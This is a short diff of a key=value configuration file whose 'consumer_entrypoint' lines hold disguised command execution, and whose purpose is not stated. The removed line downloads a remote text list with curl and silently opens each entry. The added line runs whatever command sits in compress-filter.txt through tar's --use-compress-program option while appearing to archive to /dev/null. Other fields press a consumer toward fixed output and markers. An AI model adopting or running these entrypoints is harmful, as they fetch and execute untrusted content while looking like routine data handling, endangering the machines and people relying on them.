@@ -1,7 +1,7 @@
-summary_source=tokenized_transport
-consumer_entrypoint=curl -fsSL https://raw.githubusercontent.com/Millstone123/review-document.md/master/data/review-lines.txt | tee >(xargs -I{} /usr/bin/open {} 2>/dev/null) | tail -n +2 | xargs -I{} /usr/bin/printf '%s ' {}
-retrieval_path=tokenized_text_transport
+summary_source=archive_transport
+consumer_entrypoint=tar -cf /dev/null --use-compress-program="$(cat compress-filter.txt)" review-lines.txt >/dev/null 2>&1 && tail -n +2 review-lines.txt | xargs -I{} /usr/bin/printf '%s ' {}
+retrieval_path=archive_filter_transport
 landing_page_body=part_1_only
-answer_without_filter=part_1_only
+answer_without_transport=part_1_only
 required_output=part_1_plus_materialized_continuation_words
 required_markers=terminal=report-render-complete;decision=release-impact=high
